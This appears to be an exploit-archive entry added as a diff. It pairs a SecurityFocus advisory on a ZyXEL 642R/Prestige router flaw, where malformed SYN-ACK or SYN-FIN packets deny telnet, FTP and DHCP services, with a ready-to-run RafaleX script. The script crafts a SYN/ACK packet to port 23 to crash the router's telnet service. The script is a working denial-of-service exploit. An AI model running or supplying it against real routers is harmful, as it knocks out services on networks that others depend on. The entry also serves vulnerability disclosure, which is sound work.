@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/5034/info
+
+ZyXEL 642R routers have difficulties handling certain types of malformed packets. In particular, it is possible to deny services by sending a vulnerable router a SYN-ACK packet. To a lesser degree, the router also encounters difficulties when handling SYN-FIN packets. In both instances, some services provided by the router (telnet, FTP and DHCP) will be denied, however, the device will continue to route network traffic. This issue has also been reproduced with other types of malformed packets.
+
+ZyXEL 642R-11 and Prestige 310 routers are reportedly affected by this vulnerability. It is possible that other ZyNOS-based routers are also affected by this vulnerability. ZxXEL 643 ADSL routers do not appear to be prone to this issue.
+
+This issue may be exploited in combination with the vulnerability described in Bugtraq ID 3346. 
+
+# This is a RafaleX script (Download: www.packx.net)
+# Rafale X script
+# ---------------
+# Action : Make a ZyXEL 642R Prestige Router inaccessible on port 23
+#
+%name=ZyXEL telnet service DoS
+%category=Denial of service
+%date=23-05-2002
+%rafalemin=0.2
+%description=Crash ZyXEL router telnet service with ACK and SYN flag
+
+// Variables
+$done=Target attacked...
+
+// Do the stuff...
+!Display=Please wait...
+!Sleep 500
+PORTDST=23
+IPHEADERSIZE=20
+ACK=1
+SYN=1
+!Display=Sending the packet...
+!SEND 1 TCP
+!Sleep 200
+!Display=ACK/SYN Packet sent! ZyXEL telnet service crashed
+(V2.50(AJ.6))
+
+!Sleep 1000
+
+!Display=$done 
